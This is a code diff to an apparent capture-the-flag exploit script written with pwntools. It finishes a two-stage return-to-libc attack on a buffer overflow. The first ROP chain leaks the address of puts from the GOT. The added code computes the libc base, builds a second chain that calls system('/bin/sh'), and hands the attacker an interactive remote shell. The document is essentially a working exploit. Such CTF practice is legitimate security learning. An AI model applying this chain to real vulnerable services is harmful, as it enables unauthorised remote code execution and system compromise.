@@ -37,10 +37,25 @@ def get_first_rop(puts_gots):
     # call puts with puts address, to leak address.
     rop.call('puts', [puts_gots])
     # Continure calling to do_stuff.
-    #rop.call("do_stuff")
+    rop.call("do_stuff")
 
     log.debug(f"first rop is {rop.dump()}")
 
+    ropchain = fit({OVERFLOW_OFFSET: rop})
+    return ropchain
+
+
+def get_second_rop(puts_gots):
+    # Target is to create shell in remote machine.
+    # And than cat flag.
+    rop = ROP(exe)
+    create_shell_cmd = libc.search(b'/bin/sh').__next__()
+
+    # Dummy call for align.
+    rop.call('puts', [puts_gots])
+
+    rop.call(libc.symbols['system'],[create_shell_cmd])
+    log.debug(f"second rop is {rop.dump()}")
     ropchain = fit({OVERFLOW_OFFSET: rop})
     return ropchain
 
@@ -52,6 +67,7 @@ def write_rop_to_file():
 
 def main():
     r = conn()
+
     puts_gots = exe.got["puts"]
     log.info(f"putts address in got: {puts_gots}")
     first_rop = get_first_rop(puts_gots)
@@ -59,10 +75,25 @@ def main():
     r.recvuntil(b"sErVeR!\n")
     r.sendline(first_rop)
     # The next line will be the server output (useless)
-    r.recvline()
+    useless = r.recvline()
+    log.debug(f"got from server: {useless}")
 
     puts_address_in_libc = int.from_bytes(r.recvline(keepends=False), byteorder="little")
     log.info(f"'puts' address in libc : {hex(puts_address_in_libc)}")
+
+    libc.address = puts_address_in_libc - libc.symbols['puts']
+    log.info(f"Libc base address is : {hex(libc.address)}")
+
+    second_rop = get_second_rop(puts_gots)
+    r.sendline(second_rop)
+
+    # The next line will be the server output (useless)
+    useless = r.recvline()
+    log.debug(f"got from server: {useless}")
+
+    # Interact with remote shell.
+    # For getting file just run 'cat flag.txt'
+    r.interactive()
 
 
 if __name__ == "__main__":
